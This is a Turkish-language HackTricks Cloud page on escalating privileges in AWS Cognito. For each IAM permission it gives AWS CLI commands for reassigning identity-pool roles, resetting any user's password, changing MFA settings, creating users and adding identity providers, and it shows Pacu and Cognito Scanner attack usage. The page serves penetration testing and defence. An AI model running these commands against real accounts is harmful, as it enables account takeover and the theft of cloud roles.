# AWS - Cognito Ayrıcalık Yükseltme

{% hint style="success" %}
AWS Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
GCP Hacking'i öğrenin ve uygulayın: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol edin!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katılın veya [**telegram grubuna**](https://t.me/peass) katılın veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip edin.**
* **HackTricks** ve **HackTricks Cloud** github depolarına PR göndererek hacking püf noktalarını paylaşın.

</details>
{% endhint %}

## Cognito

Cognito hakkında daha fazla bilgi için şuraya bakın:

{% content-ref url="../aws-services/aws-cognito-enum/" %}
[aws-cognito-enum](../aws-services/aws-cognito-enum/)
{% endcontent-ref %}

### Kimlik Havuzundan Kimlik Bilgileri Toplama

Cognito, hem **kimlik doğrulanmış** hem de **kimlik doğrulanmamış kullanıcılara** **IAM rol kimlik bilgileri** verebilir. Bir uygulamanın **Kimlik Havuz Kimliği**'ni (uygulamada sabitlenmiş olmalıdır) bulursanız, yeni kimlik bilgileri elde edebilir ve dolayısıyla ayrıcalık yükseltme yapabilirsiniz (muhtemelen önceden hiçbir kimlik bilgisine sahip olmadığınız bir AWS hesabında).

Daha fazla bilgi için [**bu sayfaya**](../aws-unauthenticated-enum-access/#cognito) bakın.

**Potansiyel Etki:** Kimlik doğrulanmamış kullanıcılara bağlı hizmetler rolüne doğrudan ayrıcalık yükseltme (ve muhtemelen kimlik doğrulanmış kullanıcılara bağlı olanı). 

### `cognito-identity:SetIdentityPoolRoles`, `iam:PassRole`

Bu izinle, kimlik doğrulanmış/doğrulanmamış kullanıcılara **herhangi bir cognito rolü** verebilirsiniz.
```bash
aws cognito-identity set-identity-pool-roles \
--identity-pool-id <identity_pool_id> \
--roles unauthenticated=<role ARN>

# Get credentials
## Get one ID
aws cognito-identity get-id --identity-pool-id "eu-west-2:38b294756-2578-8246-9074-5367fc9f5367"
## Get creds for that id
aws cognito-identity get-credentials-for-identity --identity-id "eu-west-2:195f9c73-4789-4bb4-4376-99819b6928374" ole
```
Eğer cognito uygulamasında **kimlik doğrulamasız kullanıcılar etkin değilse**, bunu etkinleştirmek için `cognito-identity:UpdateIdentityPool` iznine de ihtiyacınız olabilir.

**Potansiyel Etki:** Herhangi bir cognito rolüne doğrudan ayrıcalık yükseltme.

### `cognito-identity:update-identity-pool`

Bu izne sahip bir saldırgan, örneğin kendi kontrolü altındaki bir Cognito Kullanıcı Havuzu veya giriş yapabileceği başka herhangi bir kimlik sağlayıcıyı ayarlayabilir ve ardından sadece **bu Cognito Kimlik Havuzuna erişmek için bir yol olarak** giriş yapabilir. Daha sonra, o kullanıcı sağlayıcıya **giriş yapmak**, ona yapılandırılmış kimlik havuzundaki doğrulanmış rolüne **erişim izni verecektir**.
```bash
# This example is using a Cognito User Pool as identity provider
## but you could use any other identity provider
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
[--allow-unauthenticated-identities | --no-allow-unauthenticated-identities] \
--cognito-identity-providers ProviderName=user-pool-id,ClientId=client-id,ServerSideTokenCheck=false

# Now you need to login to the User Pool you have configured
## after having the id token of the login continue with the following commands:

# In this step you should have already an ID Token
aws cognito-identity get-id \
--identity-pool-id <id_pool_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>

# Get the identity_id from thr previous commnad response
aws cognito-identity get-credentials-for-identity \
--identity-id <identity_id> \
--logins cognito-idp.<region>.amazonaws.com/<YOUR_USER_POOL_ID>=<ID_TOKEN>
```
Bu izni kötüye kullanarak temel kimlik doğrulamayı **etkinleştirmek de mümkündür**:
```bash
aws cognito-identity update-identity-pool \
--identity-pool-id <value> \
--identity-pool-name <value> \
--allow-unauthenticated-identities
--allow-classic-flow
```
**Potansiyel Etki**: Kimlik havuzundaki yapılandırılmış kimlik doğrulama IAM rolünü tehlikeye atabilir.

### `cognito-idp:AdminAddUserToGroup`

Bu izin, bir Cognito kullanıcısını bir Cognito grubuna eklemeyi sağlar, bu nedenle bir saldırgan bu izni kullanarak kontrolü altındaki bir kullanıcıyı daha iyi ayrıcalıklara veya farklı IAM rollerine sahip diğer gruplara ekleyebilir:
```bash
aws cognito-idp admin-add-user-to-group \
--user-pool-id <value> \
--username <value> \
--group-name <value>
```
**Potansiyel Etki:** Diğer Cognito gruplarına ve Kullanıcı Havuzu Gruplarına bağlı IAM rollerine ayrıcalık yükseltme.

### (`cognito-idp:CreateGroup` | `cognito-idp:UpdateGroup`), `iam:PassRole`

Bu izinlere sahip bir saldırgan, **kompromize edilmiş bir Cognito Kimlik Sağlayıcısı tarafından kullanılabilecek her IAM rolü ile gruplar oluşturabilir/güncelleyebilir** ve kompromize edilmiş bir kullanıcıyı gruba dahil ederek tüm bu rolleri erişebilir:

{% code overflow="wrap" %}
```bash
aws cognito-idp create-group --group-name Hacked --user-pool-id <user-pool-id> --role-arn <role-arn>
```
{% endcode %}

**Potansiyel Etki:** Diğer Cognito IAM rollerine ayrıcalık yükseltme.

### `cognito-idp:AdminConfirmSignUp`

Bu izin, **bir kaydı doğrulamaya** olanak tanır. Varsayılan olarak, herkes Cognito uygulamalarına kaydolabilir, eğer bu izin bırakılırsa, bir kullanıcı herhangi bir veri ile bir hesap oluşturabilir ve bunu bu izinle doğrulayabilir.
```bash
aws cognito-idp admin-confirm-sign-up \
--user-pool-id <value> \
--username <value>
```
**Potansiyel Etki:** Yeni bir kullanıcı kaydı yapabilirseniz, kimlik havuzu IAM rolünde kimliği doğrulanmış kullanıcılara dolaylı bir ayrıcalık yükseltmesi yapabilirsiniz. Herhangi bir hesabı onaylayarak diğer uygulama işlevlerine dolaylı ayrıcalık yükseltmesi yapabilirsiniz.

### `cognito-idp:AdminCreateUser`

Bu izin bir saldırganın kullanıcı havuzunun içinde yeni bir kullanıcı oluşturmasına izin verir. Yeni kullanıcı etkin olarak oluşturulur, ancak şifresini değiştirmesi gerekecektir.
```bash
aws cognito-idp admin-create-user \
--user-pool-id <value> \
--username <value> \
[--user-attributes <value>] ([Name=email,Value=email@gmail.com])
[--validation-data <value>]
[--temporary-password <value>]
```
**Potansiyel Etki:** Kimlik havuzu IAM rolüne doğrudan ayrıcalık yükseltme yeteneği. Herhangi bir kullanıcı oluşturabilme yeteneği ile diğer uygulama işlevlerine dolaylı ayrıcalık yükseltme.

### `cognito-idp:AdminEnableUser`

Bu izinler, bir saldırganın devre dışı bırakılmış bir kullanıcının kimlik bilgilerini bulduğu ve tekrar etkinleştirmesi gerektiği çok nadir bir senaryoda yardımcı olabilir.
```bash
aws cognito-idp admin-enable-user \
--user-pool-id <value> \
--username <value>
```
**Potansiyel Etki:** Kimlik havuzu IAM rolüne dolaylı olarak ayrıcalık yükseltme yetkisi verir ve saldırgan devre dışı bırakılmış bir kullanıcının kimlik bilgilerine sahipse kullanıcının izinlerine erişebilir.

### `cognito-idp:AdminInitiateAuth`, **`cognito-idp:AdminRespondToAuthChallenge`**

Bu izin, [**ADMIN\_USER\_PASSWORD\_AUTH** yöntemiyle giriş yapılmasına izin verir](../aws-services/aws-cognito-enum/cognito-user-pools.md#admin\_no\_srp\_auth-and-admin\_user\_password\_auth)**.** Daha fazla bilgi için bağlantıya bakın.

### `cognito-idp:AdminSetUserPassword`

Bu izin, bir saldırganın **herhangi bir kullanıcının şifresini değiştirmesine** olanak tanır, böylece herhangi bir kullanıcının kimliğini taklit edebilir (MFA etkin olmayan kullanıcılar için).
```bash
aws cognito-idp admin-set-user-password \
--user-pool-id <value> \
--username <value> \
--password <value> \
--permanent
```
**Potansiyel Etki:** Potansiyel olarak herhangi bir kullanıcıya doğrudan ayrıcalık yükseltme, bu nedenle her kullanıcının üye olduğu tüm gruplara erişim ve Kimlik Havuzu doğrulanmış IAM rolüne erişim.

### `cognito-idp:AdminSetUserSettings` | `cognito-idp:SetUserMFAPreference` | `cognito-idp:SetUserPoolMfaConfig` | `cognito-idp:UpdateUserPool`

**AdminSetUserSettings**: Bir saldırgan, bu izni kullanarak kendi kontrolü altındaki bir mobil telefonu bir kullanıcının **SMS MFA'sı** olarak ayarlamak için potansiyel olarak kötüye kullanabilir.
```bash
aws cognito-idp admin-set-user-settings \
--user-pool-id <value> \
--username <value> \
--mfa-options <value>
```
**SetUserMFAPreference:** Öncekiyle benzer şekilde, bu izin bir kullanıcının MFA tercihlerini ayarlamak için kullanılabilir ve MFA korumasını atlamak için kullanılabilir.
```bash
aws cognito-idp admin-set-user-mfa-preference \
[--sms-mfa-settings <value>] \
[--software-token-mfa-settings <value>] \
--username <value> \
--user-pool-id <value>
```
**SetUserPoolMfaConfig**: Öncekiyle benzer şekilde, bu izin, bir kullanıcı havuzunun MFA tercihlerini ayarlamak için kullanılabilir ve MFA korumasını atlamak için kullanılabilir.
```bash
aws cognito-idp set-user-pool-mfa-config \
--user-pool-id <value> \
[--sms-mfa-configuration <value>] \
[--software-token-mfa-configuration <value>] \
[--mfa-configuration <value>]
```
**UpdateUserPool:** Kullanıcı havuzunu güncellemek ve MFA politikasını değiştirmek mümkündür. [Buradan cli'yi kontrol edin](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool.html).

**Potansiyel Etki:** Dolaylı bir ayrıcalık yükseltmesi, saldırganın kimlik bilgilerini bildiği herhangi bir kullanıcıya potansiyel olarak izin verebilir, bu da MFA korumasını atlamasına olanak tanıyabilir.

### `cognito-idp:AdminUpdateUserAttributes`

Bu izne sahip bir saldırgan, kontrolü altındaki bir kullanıcının e-posta veya telefon numarasını veya başka bir özniteliğini değiştirebilir ve altındaki bir uygulamada daha fazla ayrıcalık elde etmeye çalışabilir.\
Bu, bir e-posta veya telefon numarasını değiştirmeye ve doğrulanmış olarak ayarlamaya olanak tanır.
```bash
aws cognito-idp admin-update-user-attributes \
--user-pool-id <value> \
--username <value> \
--user-attributes <value>
```
**Potansiyel Etki:** Kullanıcı özniteliklerine dayalı ayrıcalıklar veren Cognito Kullanıcı Havuzu kullanarak temel uygulamada potansiyel dolaylı ayrıcalık yükseltme.

### `cognito-idp:CreateUserPoolClient` | `cognito-idp:UpdateUserPoolClient`

Bu izne sahip bir saldırgan, zaten mevcut havuz istemcilerinden daha az kısıtlanmış **yeni bir Kullanıcı Havuzu İstemcisi oluşturabilir**. Örneğin, yeni istemci her türlü kimlik doğrulama yöntemine izin verebilir, herhangi bir gizliye sahip olmayabilir, belirteç iptalini devre dışı bırakabilir, belirteçlerin daha uzun süre geçerli olmasına izin verebilir...

Aynısı, yeni bir istemci oluşturmak yerine, **mevcut bir istemcinin değiştirilmesi** durumunda da yapılabilir.

[**Komut satırında**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/create-user-pool-client.html) (veya [**güncelleme komutunda**](https://docs.aws.amazon.com/cli/latest/reference/cognito-idp/update-user-pool-client.html)) tüm seçenekleri görebilirsiniz, kontrol edin!.
```bash
aws cognito-idp create-user-pool-client \
--user-pool-id <value> \
--client-name <value> \
[...]
```
**Potansiyel Etki:** Kullanıcı Havuzu tarafından kullanılan Kimlik Havuzu yetkilendirilmiş kullanıcısına dolaylı bir ayrıcalık yükseltmesi olasılığı, güvenlik önlemlerini gevşeten yeni bir istemci oluşturarak ve bir saldırganın oluşturabildiği bir kullanıcı ile giriş yapmasına olanak tanıyarak mümkün hale gelir.

### `cognito-idp:CreateUserImportJob` | `cognito-idp:StartUserImportJob`

Bir saldırgan, bu izni kullanarak yeni kullanıcıları yükleyerek kullanıcılar oluşturabilir.
```bash
# Create a new import job
aws cognito-idp create-user-import-job \
--job-name <value> \
--user-pool-id <value> \
--cloud-watch-logs-role-arn <value>

# Use a new import job
aws cognito-idp start-user-import-job \
--user-pool-id <value> \
--job-id <value>

# Both options before will give you a URL where you can send the CVS file with the users to create
curl -v -T "PATH_TO_CSV_FILE" \
-H "x-amz-server-side-encryption:aws:kms" "PRE_SIGNED_URL"
```
**Potansiyel Etki:** Doğrulanmış kullanıcılar için kimlik havuzu IAM rolüne doğrudan ayrıcalık yükseltme. Herhangi bir kullanıcı oluşturabilme yeteneği ile diğer uygulama işlevlerine dolaylı ayrıcalık yükseltme.

### `cognito-idp:CreateIdentityProvider` | `cognito-idp:UpdateIdentityProvider`

Bir saldırgan yeni bir kimlik sağlayıcı oluşturabilir ve ardından **bu sağlayıcı aracılığıyla giriş yapabilir**.
```bash
aws cognito-idp create-identity-provider \
--user-pool-id <value> \
--provider-name <value> \
--provider-type <value> \
--provider-details <value> \
[--attribute-mapping <value>] \
[--idp-identifiers <value>]
```
**Potansiyel Etki:** Kimlik havuzu IAM rolüne doğrudan ayrıcalık yükseltme. Herhangi bir kullanıcı oluşturabilme yeteneği ile diğer uygulama işlevlerine dolaylı ayrıcalık yükseltme.

### cognito-sync:\* Analizi

Bu, Cognito Kimlik Havuzlarının rollerinde varsayılan olarak çok yaygın bir izindir. İzinlerin her zaman kötü göründüğü bir joker karakter içermesi (özellikle AWS'den geliyorsa), **verilen izinler saldırganın bakış açısından çok kullanışlı değildir**.

Bu izin, Kimlik Havuzlarının ve Kimlik Havuzları içindeki Kimlik Kimliklerinin kullanıcı bilgilerini okuma izni verir (bu hassas bilgi değildir).\
Kimlik Kimliklerine [**Veri Kümeleri**](https://docs.aws.amazon.com/cognitosync/latest/APIReference/API\_Dataset.html) atanabilir, bu da oturumların bilgileridir (AWS bunu bir **kayıtlı oyun** gibi tanımlar). Bu, bazı hassas bilgiler içerebilir (ancak olasılık oldukça düşüktür). Bu bilgilere nasıl erişileceğini [**enumarasyon sayfasında**](../aws-services/aws-cognito-enum/) bulabilirsiniz.

Bir saldırgan ayrıca bu izinleri kullanarak kendisini bu veri kümelerindeki değişiklikleri yayınlayan bir Cognito akışına **kaydettirebilir** veya **cognito etkinliklerinde tetikleyici olan bir lambda** kullanabilir. Bunu kullanıldığını görmedim ve burada hassas bilgi beklemem, ancak imkansız değil.

### Otomatik Araçlar

* [Pacu](https://github.com/RhinoSecurityLabs/pacu), AWS sızma çerçevesi, artık hesaptaki tüm Cognito varlıklarının enumarasyonunu otomatikleştiren ve zayıf yapılandırmaları işaretleyen "cognito\_\_enum" ve "cognito\_\_attack" modüllerini içerir, erişim kontrolü için kullanılan zayıf yapılandırmaları, kullanıcı özniteliklerini vb. ve ayrıca kullanıcı oluşturmayı (MFA desteği de dahil olmak üzere) ve değiştirilebilir özel özniteliklere dayalı ayrıcalık yükseltmeyi, kullanılabilir kimlik havuzu kimlik bilgilerini, id belgelerindeki rolü assumable rolleri otomatikleştirir.

Modüllerin işlevlerinin açıklaması için [blog yazısının](https://rhinosecuritylabs.com/aws/attacking-aws-cognito-with-pacu-p2) 2. bölümüne bakın. Kurulum talimatları için ana [Pacu](https://github.com/RhinoSecurityLabs/pacu) sayfasına bakın.

#### Kullanım

Belirli bir kimlik havuzu ve kullanıcı havuzu istemcisine karşı kullanıcı oluşturma ve tüm ayrıcalık yükseltme vektörlerini denemek için örnek cognito\_\_attack kullanımı:
```bash
Pacu (new:test) > run cognito__attack --username randomuser --email XX+sdfs2@gmail.com --identity_pools
us-east-2:a06XXXXX-c9XX-4aXX-9a33-9ceXXXXXXXXX --user_pool_clients
59f6tuhfXXXXXXXXXXXXXXXXXX@us-east-2_0aXXXXXXX
```
Örnek cognito\_\_enum kullanımı, mevcut AWS hesabında görülebilen tüm kullanıcı havuzları, kullanıcı havuzu istemcileri, kimlik havuzları, kullanıcılar vb. toplamak için:
```bash
Pacu (new:test) > run cognito__enum
```
* [Cognito Scanner](https://github.com/padok-team/cognito-scanner), Cognito üzerinde farklı saldırıları uygulayan, biri de ayrıcalık yükseltme olan bir Python CLI aracıdır.

#### Kurulum
```bash
$ pip install cognito-scanner
```
#### Kullanım
```bash
$ cognito-scanner --help
```
Daha fazla bilgi için [https://github.com/padok-team/cognito-scanner](https://github.com/padok-team/cognito-scanner)

{% hint style="success" %}
Öğren ve AWS Hacking pratiği yap:<img src="/.gitbook/assets/image.png" alt="" data-size="line">[**HackTricks Eğitim AWS Kırmızı Takım Uzmanı (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/image.png" alt="" data-size="line">\
Öğren ve GCP Hacking pratiği yap: <img src="/.gitbook/assets/image (2).png" alt="" data-size="line">[**HackTricks Eğitim GCP Kırmızı Takım Uzmanı (GRTE)**<img src="/.gitbook/assets/image (2).png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Destek HackTricks</summary>

* [**Abonelik planlarını**](https://github.com/sponsors/carlospolop) kontrol et!
* 💬 [**Discord grubuna**](https://discord.gg/hRep4RUj7f) katıl veya [**telegram grubuna**](https://t.me/peass) katıl veya bizi **Twitter** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** takip et.**
* **Hacking püf noktalarını paylaşmak için PR'lar göndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarına katkıda bulun.

</details>
{% endhint %}
